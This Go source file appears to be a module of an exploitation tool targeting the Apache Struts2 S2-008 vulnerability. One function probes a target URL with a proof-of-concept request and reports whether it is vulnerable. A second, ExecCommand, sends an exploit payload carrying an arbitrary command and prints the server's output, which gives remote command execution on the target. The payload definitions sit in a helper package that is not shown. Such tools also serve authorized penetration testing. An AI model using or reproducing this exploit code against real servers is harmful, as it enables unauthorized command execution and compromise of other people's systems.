package s008

import (
	"ST2G/cvemod/utils"
	"fmt"
	"log"
)

func Check(targetUrl string) {
	respString := utils.GetFunc4Struts2(targetUrl, "", utils.PocS008Check)
	if utils.IfContainsStr(respString, utils.CheckFlag) {
		log.Printf("%v %v", utils.Green(targetUrl), utils.Red("*Found Struts2-008！"))
	} else {
		log.Printf("%s Struts2-008 Not Vulnerable.", utils.Green(targetUrl))
	}
}
func ExecCommand(targetUrl string, command string) {
	respString := utils.GetFunc4Struts2(targetUrl, "", utils.PocS008Exec(command))
	fmt.Println(respString)
}
